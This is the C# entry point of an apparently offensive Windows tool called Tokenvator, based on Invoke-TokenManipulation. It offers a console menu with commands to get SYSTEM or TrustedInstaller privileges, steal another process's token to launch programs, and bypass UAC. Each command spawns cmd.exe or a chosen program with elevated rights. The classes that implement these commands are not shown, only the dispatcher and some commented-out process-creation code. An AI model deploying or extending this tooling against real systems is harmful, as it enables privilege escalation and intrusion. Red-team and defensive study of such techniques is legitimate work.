using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Management.Instrumentation;
using System.Text;



////////////////////////////////////////////////////////////////////////////////
// https://github.com/clymb3r/PowerShell/blob/master/Invoke-TokenManipulation/Invoke-TokenManipulation.ps1
////////////////////////////////////////////////////////////////////////////////
namespace Tokenvator
{
    class Program
    {
        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        static void Main(string[] args)
        {
            while (true)
            {
                try
                {
                    Console.Write("(Tokens) > ");
                    String input = Console.ReadLine();
                    if (input.ToLower().Contains("getsystem"))
                    {
                        String[] split = input.Split(' ');
                        if (split.Length >= 2)
                        {
                            new Tokens().GetSystem(split[1]);
                        }
                        else
                        {
                            new Tokens().GetSystem("cmd.exe");
                        }
                    }
                    else if (input.ToLower().Contains("gettrustedinstaller"))
                    {
                        String[] split = input.Split(' ');
                        if (split.Length >= 2)
                        {
                            new Tokens().GetTrustedInstaller(split[1]);
                        }
                        else
                        {
                            new Tokens().GetTrustedInstaller("cmd.exe");
                        }
                    }
                    else if (input.ToLower().Contains("stealtoken"))
                    {
                        String[] split = input.Split(' ');
                        if (split.Length >= 3)
                        {
                            new Tokens().StartProcessAsUser(Int32.Parse(split[1]), split[2]);
                        }
                        else
                        {
                            new Tokens().StartProcessAsUser(Int32.Parse(split[1]), "cmd.exe");
                        }
                    }
                    else if (input.ToLower().Contains("bypassuac"))
                    {
                        String[] split = input.Split(' ');
                        if (split.Length >= 3)
                        {
                            new RestrictedToken().BypassUAC(Int32.Parse(split[1]), split[2]);
                        }
                        else
                        {
                            new RestrictedToken().BypassUAC(Int32.Parse(split[1]), "cmd.exe");
                        }
                    }
                    else if (input.Contains("exit"))
                    {
                        return;
                    }
                    else
                    {
                        Console.WriteLine("Invalid Options");
                        Console.WriteLine("GetSystem            <new_process>");
                        Console.WriteLine("GetTrustedInstaller  <new_process>");
                        Console.WriteLine("StealToken           <process_id> <new_process>");
                        Console.WriteLine("BypassUAC            <process_id> <new_process>");
                    }
                }
                catch (Exception error)
                {
                    Console.WriteLine(error.ToString());
                }
                finally
                {

                }
            }
                                     
                   
        }

        

        
        

        

        

        

        
        /*
        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static void CreateProcessAsUser(IntPtr phNewToken, String name, String arguments)
        {
            IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
            IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
            Structs._SECURITY_ATTRIBUTES lpProcessAttributes = new Structs._SECURITY_ATTRIBUTES();
            Structs._SECURITY_ATTRIBUTES lpThreadAttributes = new Structs._SECURITY_ATTRIBUTES();
            Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Structs._STARTUPINFO));
            Structs._PROCESS_INFORMATION processInformation = new Structs._PROCESS_INFORMATION();
            if (!Unmanaged.CreateProcessAsUser(
                phNewToken,
                lpProcessName,
                lpProcessArgs,
                ref lpProcessAttributes,
                ref lpThreadAttributes,
                false,
                Enums.CREATION_FLAGS.NONE,
                IntPtr.Zero,
                IntPtr.Zero,
                ref startupInfo,
                out processInformation))
            {
                GetError("CreateProcessAsUser: ");
                return;
            }
            Console.WriteLine("[+] Created process: " + processInformation.dwProcessId);
            Console.WriteLine("[+] Created thread: " + processInformation.dwThreadId);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static void CreateProcessAsUserW(IntPtr phNewToken, String name, String arguments)
        {
            IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
            IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
            Structs._SECURITY_ATTRIBUTES lpProcessAttributes = new Structs._SECURITY_ATTRIBUTES();
            Structs._SECURITY_ATTRIBUTES lpThreadAttributes = new Structs._SECURITY_ATTRIBUTES();
            Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Structs._STARTUPINFO));
            Structs._PROCESS_INFORMATION processInformation = new Structs._PROCESS_INFORMATION();
            if (!Unmanaged.CreateProcessAsUserW(
                phNewToken,
                lpProcessName, 
                lpProcessArgs,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                Enums.CREATION_FLAGS.NONE,
                IntPtr.Zero,
                IntPtr.Zero,
                ref startupInfo,
                out processInformation
            ))
            {
                GetError("CreateProcessAsUserW: ");
                return;
            }
            Console.WriteLine("[+] Created process: " + processInformation.dwProcessId);
            Console.WriteLine("[+] Created thread: " + processInformation.dwThreadId);
        }

        
        */
        
    }
}